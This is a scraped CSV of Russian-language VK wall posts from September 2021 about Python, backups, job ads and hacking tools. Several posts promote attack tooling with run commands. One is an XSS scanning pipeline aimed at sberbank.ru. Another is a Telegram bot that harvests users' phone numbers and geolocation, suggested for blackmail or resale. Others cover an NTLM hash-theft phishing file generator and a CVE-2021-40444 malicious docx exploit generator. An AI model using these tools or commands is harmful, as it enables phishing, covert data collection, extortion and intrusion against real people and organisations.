url,date,likes,reposts,subscribers,text,images,index
https://vk.com/wall554194409_2423,2021-09-23 02:34:39,3,1,170,"Ves' CSS + HTML v neskol'kikh failakh. Est' eshche javascript v odnoi kartinke, tozhe prikrepil, no ia ne uveren chto eto dostovernaia infa. Kartinku s dzhavaskriptom nado proveriat'.   A vo, eshche piton 3 naryl. Eba piton v odnoi kartinke. Nicho si.   Krutye shpory. Chut' poduchiv mozhno delat' odnostanichniki, a dobaviv synasatanyvlastiteliamrakamrazotnyiiazykprogrammirovaniia java script mozhno priam polnotsennye saity delat' i bablo zarabatyvat' ili ustroitsia verstal'shchikom.  https://github.com/coodict/python3-in-one-pic - piton v odnoi kartinke. Avtor. https://github.com/coodict/javascript-in-one-pic - JS v odnoi kartinke. Avtor.",[],11
https://vk.com/wall-206723877_1283,2021-09-22 17:30:00,1,3,120,Aliens_eye OSINT. Naiti vse uchetnye zapisi v sotsial'nykh setiakh s imenem pol'zovatelia!   git clone https://github.com/BLINKING-IDIOT/Aliens_eye cd Aliens_eye pip3 install requests python3 aliens_eye.py,"['https://sun9-5.userapi.com/impg/LXyqyFgoJEOCIq-69mheyYmgFBSfxs4zcU6RWQ/ZWzjFEdzPJg.jpg?size=200x133&quality=96&crop=6,0,983,654&sign=fe920bb1bcb91e5579d8f3b37871f4f9&c_uniq_tag=F4wy0QJolo1-X44efDmp1PusdIpEwOV7aiq_bb8IPa4&type=album']",12
https://vk.com/wall-169106523_14727,2021-09-22 15:55:00,21,7,10928,#security@greyteam,[],13
https://vk.com/wall-95686747_8638,2021-09-22 15:30:00,40,25,8376,"Davno ne bylo zametok pro poleznye utility dlia bekapa. Reshil eto ispravit'. Rasskazyvaiu pro Butterfly Backup. Eto nebol'shaia konsol'naia obiortka nad rsync, napisannaia na python. Ideia eio v tom, chto ona ispol'zuet osnovnoe preimushchestvo rsync - skorost' sravneniia i kopirovaniia informatsii. A tak zhe dobavliaet nekotoruiu gibkost', kotoroi iznachal'no v rsync net. To est' rasshiriaet ego funktsional.    https://github.com/MatteoGuadrini/Butterfly-Backup  https://butterfly-backup.readthedocs.io/en/latest/    Butterfly Backup izbavliaet ot neobkhodimosti pisat' sobstvennuiu bash obviazku vokrug rsync dlia organizatsii inkrementnykh ili raznostnykh bekapov. Tak zhe uproshchaet vosstanovlenie i prosmotr soderzhimogo bekapov. Dlia udobstva mozhno podgotovit' gotovyi konfig.    Osnovnye vozmozhnosti:     Podderzhivaemye bekapy: Full, Incremental, Differential, Mirror.     Ispol'zovanie tsentral'nogo servera dlia khraneniia bekapov raznykh klientov.     Detal'nyi prosmotr soderzhimogo otdel'nykh bekapov.     Bekap vsei sistemy, a tak zhe ee vosstanovlenie na drugoe zhelezo ili VM.     Printsip sniatiia dannykh agent-less, po protokolu rsync ili ssh.    Dlia raboty BB nuzhen Python3. Dalee dostatochno skopirovat' repozitorii i zapustit' skript ustanovki:  git clone https://github.com/MatteoGuadrini/Butterfly-Backup.git  cd Butterfly-Backup  sudo python3 setup.py    Posle etogo kopiruem rsa kliuchi, kotorye predvaritel'no sozdali, na udalennyi host, chtoby imet' k nemu dostup:  bb config --deploy host1    Dal'she zapuskaem prostoi bekap:  bb backup --computer host1 --destination /mnt/backup --data System --type Unix    U bb est' prednastroiki dlia tipovykh bekapov triokh tipov sistem - Unix, Windows, MacOS. Esli ukazat' posle kliucha data tip dannykh i dalee tip sistemy, to budet zabekapleno vsio, chto otnositsia k etomu tipu. V moem primere eto sistemnye direktorii.    Po ssylke na dokumentatsiiu, chto ia privel v nachale, mozhno posmotret' vse osnovnye vozmozhnosti i kliuchi dlia bekapa i vosstanovleniia.",['https://sun9-57.userapi.com/impg/rZIlwrjl4lNfWSxqT1rCBRCokAcRrK31jfUXig/GON9AzyvF34.jpg?size=200x179&quality=96&sign=5c453b2a1936a0f3134fb404e512ea1f&c_uniq_tag=BplEdk4ng6JTEO7asH_TXlgPA4-aAx7NH11qhXmZEds&type=album'],14
https://vk.com/wall-3183750_354394,2021-09-22 10:10:00,65,67,94166,Etichnyi khaking s Python   #1 Python2 vs Python3   #2 Pishem pervuiu programmu na Python.   #3 Ustanovka i ispol'zovanie Python IDE.   #4 Chto takoe MAC-adres.   #5 Meniaem MAC-adres vruchnuiu.   #6 Ispol'zovanie modulei Python i vypolnenie sistemnykh komand.   #7 Pishem prostuiu programmu dlia smeny MAC-adresa.   #Python #hacking       #video@php2all bol'she video v nashem kataloge https://vk.com/videos-3183750,"['https://sun9-46.userapi.com/c857632/v857632103/9c12d/f8LKFIy4ypk.jpg', 'https://sun9-61.userapi.com/c858332/v858332103/9e819/oqPDiDH_kBM.jpg', 'https://sun9-60.userapi.com/c857632/v857632103/9c131/bBxiSWPuYKU.jpg', 'https://sun9-41.userapi.com/c857436/v857436103/a0416/2CD6HbMb0JA.jpg', 'https://sun9-71.userapi.com/c855032/v855032103/10fa1b/puIpwNcdxsg.jpg', 'https://sun9-14.userapi.com/c853524/v853524103/11e6be/8T03N-NxyU4.jpg', 'https://sun9-52.userapi.com/c854028/v854028103/11bef4/CJE5tf272_A.jpg']",15
https://vk.com/wall-196574325_14896,2021-09-22 05:02:17,0,0,454,"!! Junior Python Developer Privet! hybrid.ai -- samyi innovatsionnyi i nezavisimyi adtech proekt v Rossii. hybrid.ai -- mezhdunarodnaia programmatic-platforma. My razrabatyvaem reklamnye tekhnologii dlia vedushchikh mirovykh agentstv i brendov. Den' za dnem my uluchshaem funktsional'nye vozmozhnosti i kachestvo produktov dlia prevoskhodnogo rezul'tata reklamnykh kampanii. My sotrudnichaem s takimi krupnymi mirovymi kompaniiami kak Google, Facebook, Yandex, AppNexus, Begun, Mopub i mnogimi drugimi. Sredi nashikh klientov bolee 100 krupneishikh reklamnykh agentstv (GroupM, BBDO, Dentsu Aegis Network, Publicis Groupe i dr.), i bolee 300 vedushchikh brendov (Audi, Lexus, Honda, Nestle, Red Bull, Asus, P&amp;G, Schwarzkopf i dr.). Ofisy hybrid.ai nakhodiatsia v Rossii, Germanii, SShA, Indii, Pol'she i Singapure.Seichas my v aktivnom poiske Junior Python Developer v sviazi s rasshireniem shtata. Chem predstoit zanimat'sia:  Napisanie skraperov dlia saitov, parsing dannykh; Refaktoring sushchestvuiushchikh prilozhenii; Razrabotka Rest Api i napisanie dokumentatsii k nemu; Integratsiia so storonnimi API; Razvitie sistemy monitoringa; Sozdanie prilozhenii dlia polucheniia i analiza dannykh.  Nashi trebovaniia k kandidatam:  Znanie Python3; Znanie Linux na urovne pol'zovatelia; Ponimanie chem otlichaiutsia SQL ot NoSql. Opyt raboty s kakoi libo bazoi; Znanie kakogo libo veb - freimvorka (naprimer Flask); Ponimanie printsipov Rest; Stremlenie pisat' chitaemyi kod; Bazovye znaniia sistem kontrolia versii (Git); Angliiskii iazyk na urovne svobodnogo chteniia dokumentatsii;  Chto my predlagaem dlia komfortnoi raboty:  Druzhnaia komanda i liogkaia kommunikatsiia; Professional'noe razvitie, svoboda proiavleniia idei i myslei; Shtatnyi prepodavatel' angliiskogo iazyka; Korporativnyi trener iogi.  A teper' o formal'nom:  Gibkoe nachalo i okonchanie rabochego dnia; Oformlenie i garantii po TK RF; Uiutnyi ofis v tsentre goroda so vsemi pliusami.       Sviazat'sia mozhno po ssylke: https://resumetrud.com/tambov/vakansii/15732135/  #rabota_v_Rossii #rabota_Tambov #Junior_PythonDeveloper",[],16
https://vk.com/wall-199917069_844,2021-09-21 08:01:19,0,0,8, python3 paramspider.py -d sberbank.ru -o param.txt; cd output/ ; cat param.txt | Gxss -p governmentAPT | dalfox pipe --mining-dict /path/to/arjun/db/params.txt --skip-bav,[],17
https://vk.com/wall-189351141_16354,2021-09-20 21:26:58,0,0,428,"V etoi serii postov ia khotel by pogovorit' o Linux Page Cache. Ia schitaiu, chto dannye znaniia teorii i instrumentov zhiznenno neobkhodimy i vazhny dlia kazhdogo SRE. Obshchee ponimanie kak rabotaet Page Cache pomogaet i v rutinnykh povsednevnykh zadachakh, i v ekstrennoi otladke na prodakshene. Pri etom Page Cache chasto ostavliaiut bez vnimaniia,  a ved' ego luchshee ponimanie. kak pravilo, privodit k:",[],18
https://vk.com/wall-197833188_157,2021-09-20 15:52:34,0,0,3,,[],19
https://vk.com/wall-206992505_163,2021-09-20 15:48:00,7,0,360,"Chto nuzhno znat' Python-razrabotchiku Startovat' v liuboi kar'ere, v tom chisle i python-programmistu stoit s azov professii. Itak, davaite dlia nachala razberiomsia, kakimi znaniiami dolzhen obladat' Junior Python-developer (novichok). Potentsial'nomu Python-spetsialistu sleduet chitat' mnogo literatury, umet' bystro nakhodit' nuzhnuiu informatsiiu, a takzhe:    Predstavliat' chto takoe operatsionnye sistemy, dlia chego oni nuzhny, kakie tam proiskhodiat protsessy;  Znat', chto takoe potok;  Chto takoe sokety i dlia chego oni nuzhny;  Predstavliat', kak ustroen stek protokolov TCP/IP;  Chto takoe Linux, sh.;  Ponimat' virtualizatsiiu i vse eio tipy;  Umet' nastraivat' onlain-mashiny s pomoshch'iu razlichnykh instrumentov;  Ponimat', chto takoe OOP i ego funktsional;  Rabotat' s GIT(sozdavat' vetki);  Ponimat', chto takoe MVC i zachem on nuzhen;  Umet' rabotat' s bazami dannykh;  Ponimat' asinkhronnuiu kontseptsiiu programmirovaniia;  Rabotat' s nginx (nastroika proksi);  Razbirat'sia v otlichiiakh Python2 ot Python3;  Predstavliat' chto takoe algoritm importa modulei v Python;  Chto predstavliaiut iz sebia generatory i iteratory;  Ponimat' chto takoe GIL i zachem on nuzhen;  Razbirat'sia v WSGI i ponimat' kak ispol'zovat' ego v rabote.  Okunuvshis' v novyi mir i poniav kak mnogo v niom interesnogo, programmisty s novym opytom prodolzhaiut svoi kar'ernyi put'. Dalee, rassmotrim spisok togo, chto dolzhen znat' python-razrabotchik v srednem, po mneniiu rabotodatelei (v dopolnenie k predydushchim trebovaniiam):    Umelo ispol'zovat' sam iazyk, biblioteki, ego sintaksis, veb-freimvorki (Django i Flask);  Ponimat' printsipy raboty s bazami dannykh, algoritmami i SQL;  Angliiskii iazyk, potomu chto komandy v Python pishutsia na etom iazyke;  Znat' i umet' ispol'zovat' v rabote sistemy kontrolia versii (Git);  Ponimat' upravlenie paketami (versii, zavisimosti) v distributive i okruzhenii Python;  Umet' testirovat' kod, rabotat' s nepreryvnoi integratsiei;  Razbirat'sia v optsiiakh razviortyvaniia koda;  Realizovyvat' vse urovni steka (proekta);  Rabotat' s bibliotekami dlia raspredeleniia i obrabotki dannykh;  Umet' rabotat' v komande na urovne koda: pisat' chitaemyi kod, analizirovat' kod svoikh kolleg (code-review);  Ponimat' metodologiiu razrabotki.  Vmeste s etimi navykami spetsialistu neobkhodimy takie lichnye kachestva kak usidchivost', trudoliubie, analiticheskii sklad uma i umenie rabotat' v komande.",[],20
https://vk.com/wall-189351141_16353,2021-09-20 09:23:48,0,0,428,"Stat'ia iavliaetsia prodolzheniem pervoi, vtoroi i tret'ei chastei, posviashchionnykh organizatsii prakticheskoi bezopasnosti setei, postroennykh na oborudovanii MikroTik. Ranee byli rassmotreny obshchie rekomendatsii, bezopasnost' urovnei L1, L2 i L3, realizatsiia tsentralizovannogo logirovaniia. Nastalo vremia pogovorit' pro razviortyvanie IDS i eio integratsiiu v infrastrukturu RouterOS.",[],21
https://vk.com/wall-169106523_14651,2021-09-19 16:04:00,30,34,10928,#pentest@greyteam,[],22
https://vk.com/wall-189351141_16345,2021-09-19 09:23:20,0,0,428,"Dobryi den' druz'ia. Kak-to mne zakhotelos' ustanovit' Qbittorrent na moi router kotoryi osnashchen OpenWRT. Konechno sozdateli OpenWRT uzhe predusmotreli vozmozhnost' sborki kastomnykh paketov ob etom mozhno pochitat' vot tut: https://habr.com/ru/company/ruvds/blog/530984/ . No dannyi sposob ochen' dolgii, prikhoditsia skachivat' iskhodniki OpenWRT, kompilirovat' tulchain i prochee. I ia podumal a pochemu-by prosto ne skachat' tulchain i sobrat' proekt obychnym obrazom. Pod katom moi opyt.",[],23
https://vk.com/wall-206419000_115,2021-09-19 08:06:51,6,2,90,"DNNME (https://github.com/lamer112311/DNNME.git) -- telegram-bot, kotoryi <<uznaet>> dannye po nomeru telefona. A chtoby poluchit' <<dannye>> nuzhno zaregistrirovat'sia v bote, tem samym pol'zovatel' otpravliaet kontakt botu i geopozitsiiu, v rezul'tate my imeem nomer i geolokatsii pol'zovatelia    Vse dannye s bota budut idti priamo k vam v ls v Telegram. Primenenii mozhno naiti mnogo, k primeru, obychnyi shantazh, libo sbor ogromnoi bazy pol'zovatelei, kotoruiu v posledstvii mozhno prodat'.    Ustanovka    $ apt update  $ apt upgrade -y  $ apt install git python3  $ pip3 install colorama pyTelegramBotAPI  $ git clone https://github.com/lamer112311/DNNME.git  $ cd DNNME    Teper' perekhodim v Telegram. otkryvaem @my_id_bot, kopiruem nash ID i zapisyvaem ego. Perekhodim v [id199142634|@BotFather], vvodim /newbot, dalee pishem nuzhnye dannye. Kogda sam bot sozdan, kopiruem ego token i zapisyvaem ego.    Zapusk    $ python3 Build.py    Vvodim nash Telegram ID, potom vvodim Token bota. V papke dolzhen poiavitsia gotovyi skript dlia zapuska bota.    $ python3 Dnnme.py  Diskleimer: Predstavlennyi material, iavliaetsia oznakomitel'nym . Avtor ne nesiot otvetstvennosti za deistviia sovershennye chitateliami.    Skript polnost'iu rabochii ",['https://sun9-25.userapi.com/impg/1S-AU-t5VMd0Q_68wveJNCmlqASrbe8RnV_wRQ/7dfUaqaRAZE.jpg?size=200x133&quality=96&sign=1a52f8a6c0a6dd2fdb6a66e7b04ec5f8&c_uniq_tag=PtB8f53C0mecT2J3Z2p6V7PrlzmijYEqVqsao1mD_r4&type=album'],24
https://vk.com/wall-105076815_38608,2021-09-18 12:46:27,1,0,5023,"A tool for generating multiple types of NTLMv2 hash theft files.  ntlm_theft is an Open Source Python3 Tool that generates 21 different types of hash theft documents. These can be used for phishing when either the target allows smb traffic outside their network, or if you are already inside the internal network.  The benefits of these file types over say macro based documents or exploit documents are that all of these are built using ""intended functionality"". None were flagged by Windows Defender Antivirus on June 2020, and 17 of the 21 attacks worked on a fully patched Windows 10 host.  ntlm_theft supports the following attack types:    Browse to Folder Containing    .url - via URL field  .url - via ICONFILE field  .lnk - via icon_location field  .scf - via ICONFILE field (Not Working on Latest Windows)  autorun.inf via OPEN field (Not Working on Latest Windows)  desktop.ini - via IconResource field (Not Working on Latest Windows)      Open Document    .xml - via Microsoft Word external stylesheet  ... #ntlm_theft #windows #windows10 #windowsdefender",[],25
https://vk.com/wall534637194_7771,2021-09-17 15:50:17,0,0,23,"Python Programming Master Course Udemy - Coding Minutes, Mohit Uniyal, Prateek Narang  Dobro pozhalovat' na master-kurs po programmirovaniiu na Python (2021 g.) - samyi polnyi i nadezhnyi kurs Python3 ot Coding Minutes, prednaznachennyi dlia absoliutnykh novichkov i razrabotchikov! Python - samyi populiarnyi iazyk programmirovaniia 21 veka. On shiroko ispol'zuetsia v mashinnom obuchenii i nauke o dannykh. Mnogie vedushchie kompanii, takie kak Instagram...  Python Programming Master Course - Udemy (2021)","['https://sun9-76.userapi.com/impg/CrGqUgBmuWNK2KvUj_V5XHTLBkkbsHFss0epnw/BMpm9E0GYTA.jpg?size=200x133&quality=96&crop=338,0,346,230&sign=9698dd57dc2e312995eff3cdcadcda75&c_uniq_tag=PfC6yAqtr6_8eMrb3CdyRDaJKzihAnAbiAEPB63Og9I&type=album']",26
https://vk.com/wall-177780940_16442,2021-09-16 21:43:26,0,0,1033,"Stolknulsia s problemoi: neobkhodimo vstroit' skript, napisannyi na Python3 v prilozhenie. Vozmozhno li eto realizovat' ili stoit pokopat'sia v analogakh na Java? Voobshche byli idei postavit' skript na server, no khochetsia realizatsiiu na storone klie... The post Integratsiia skripta Python v prilozhenie na Kotlin first appeared on Poleznoe dlia razrabotchika.",[],27
https://vk.com/wall-105076815_38585,2021-09-16 13:33:29,0,0,5023,"Malicious docx generator to exploit CVE-2021-40444 (Microsoft Office Word Remote Code Execution)Creation of this Script is based on some reverse engineering over the sample used in-the-wild: 938545f7bbe40738908a95da8cdeabb2a11ce2ca36b0f6a74deda9378d380a52 (docx file)You need to install lcab first (sudo apt-get install lcab)Check REPRODUCE.md for manual reproduce stepsIf your generated cab is not working, try pointing out exploit.html URL to calc.cabUsingFirst generate a malicious docx document given a DLL, you can use the one at test/calc.dll which just pops a calc.exe from a call to system()python3 exploit.py generate test/calc.dll http://Once you generate the malicious docx (will be at out/) you can setup the server:sudo python3 exploit.py host 80Finally try the docx in a Windows Virtual Machine:  #cve-2021-40444 #generator #python3 #remote #reverse #reverseengineering #windows",[],28
https://vk.com/wall220602690_654,2021-09-16 11:08:35,2,2,67,"V komandu Whalemap.io ishchem Backend i Frontend razrabotchikov. (Fronty, pishite v lichku, prishliu opisanie)  Whalemap - eto platforma, kotoraia obsluzhivaet investorov i treiderov kriptovaliutnogo rynka. My predostavliaem pol'zovateliu dostup k intuitivno poniatnoi i tochnoi analitike kriptovaliutnogo rynka. Na dannyi moment my imeem okolo 30k zaregistrirovannykh pol'zovatelei.  Zarplatnaia vilka: 150 000 - 300 000 R na ruki  Kakoi nuzhen stek? * Python3, Django/Flask, Numpy, Pandas, Plotly, Nginx/Apache2 * SQL: indeksy, tranzaktsionnost', okonnye funktsii * BD: SQLAlchemy, Redis, Vertica/Clickhouse, PostgreSQL * CI/CD: Gitlab CI, Docker, K8s * Ocheredi: ZMQ, RabbitMQ, Kafka * Linux: Ubuntu 18 * Prometheus, Grafana, EFK, Sentry * Bol'shim pliusom budut prakticheskii opyt s Threading/Multiprocessing v Python, administrirovanie AWS i opyt programmirovaniia na C++  Chto nuzhno delat'? * Zanimat'sia razrabotkoi biznes-logiki i back-end sistemy dlia podderzhki platformy Whalemap.io * Uchastvovat' v protsesse razrabotki novykh fich (ikh budet mnogo) * Vnosit' svoi predlozheniia kak po tekhnicheskomu, tak i po produktovomu uluchsheniiu platformy, a takzhe predlagat' svoi idei i proveriat' ikh sostoiatel'nost' * Derzhat' ruku na pul'se novykh tekhnologii i vnedriat' ikh, kogda eto prinesiot pol'zu proektu i komande * Uchastvovat' v uluchshenii protsessov komandy razrabotki * Provodit' rev'iu koda kolleg po komande * Samostoiatel'no reshat' zadachi  Usloviia: - Udalionnaia ili rabota v ofise (Moskva) na tvoi vybor  - Gibkii rabochii den'; - Dinamichno razvivaiushchaiasia kompaniia; - Innovatsionnyi, progressivnyi proekt; - Druzhnyi kollektiv.  Nash tvitter: https://twitter.com/whale_map Nash sait: https://whalemap.io",[],29
https://vk.com/wall163931991_49189,2021-09-16 10:25:21,6,4,372,,[],30
https://vk.com/wall-163703907_31916,2021-09-16 10:00:01,56,86,23805,,[],31
https://vk.com/wall-206723877_841,2021-09-15 20:00:00,1,1,120,,[],32
https://vk.com/wall-163703907_31906,2021-09-15 10:00:01,38,36,23805,,[],33
